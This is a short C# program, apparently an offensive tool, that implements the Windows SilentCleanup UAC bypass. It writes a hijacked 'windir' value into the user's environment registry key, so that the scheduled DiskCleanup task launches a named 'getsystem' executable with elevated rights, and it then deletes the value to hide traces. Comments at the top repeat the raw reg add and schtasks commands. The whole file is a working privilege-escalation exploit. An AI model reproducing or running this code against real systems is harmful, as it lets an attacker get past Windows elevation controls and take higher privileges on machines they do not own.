using System;
using System.Diagnostics;

// reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f && REM "
// schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I

namespace silentcleanup_uac
{
    class Program
    {
        static void Main(string[] args)
        {
            string path1 = System.IO.Directory.GetCurrentDirectory();
            Console.WriteLine(path1 + "\\appxdeploymentserver_getsystem.exe");
            Process process_cmd = new Process();
            process_cmd.StartInfo.FileName = "cmd.exe";
            process_cmd.StartInfo.RedirectStandardInput = true;
            process_cmd.StartInfo.RedirectStandardOutput = true;
            process_cmd.Start();
            //  | .\\" + path1+ "\\appxdeploymentserver_getsystem.exe 
            process_cmd.StandardInput.WriteLine("reg add hkcu\\Environment /v windir /d \"cmd /C "+path1+ "\\appxdeploymentserver_getsystem.exe & cmd /C reg delete hkcu\\Environment /v windir /f && REM \"");
            process_cmd.StandardInput.WriteLine("schtasks /Run /TN \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /I");
        }
    }
}
